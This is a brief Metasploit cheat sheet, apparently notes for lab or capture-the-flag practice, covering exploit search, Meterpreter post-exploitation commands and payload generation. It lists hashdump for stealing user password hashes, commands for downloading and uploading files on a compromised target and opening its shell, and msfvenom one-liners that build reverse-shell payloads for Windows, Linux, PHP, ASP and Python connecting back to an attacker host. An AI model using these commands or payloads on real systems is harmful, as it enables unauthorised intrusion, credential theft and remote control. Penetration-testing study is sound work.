#### Filter to get exploits for perticular service
```bash
search type:exploit smb
```
#### Hashes of user
```bash
hashdump

Note : Execute in meterpreter session
```
```bash
once you got meterpreter session
sysinfo
shell -> to get linux shell
```
#### Commands
```bash
List all available Meterpreter commands -> ?
#  system information of the target.
-> sysinfo
getuid - Display current user ID. 
getpid - Show current Meterpreter process ID. 
ps - List running processes. 
cd - Change directory 
ls - List files in current directory 
download <file name> - Download file from target. 
upload  <file name> - Upload file to target. 
shell - Drop into the target system’s command shell. 
bg - Background current session. 
```

#### Payloads
```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

```
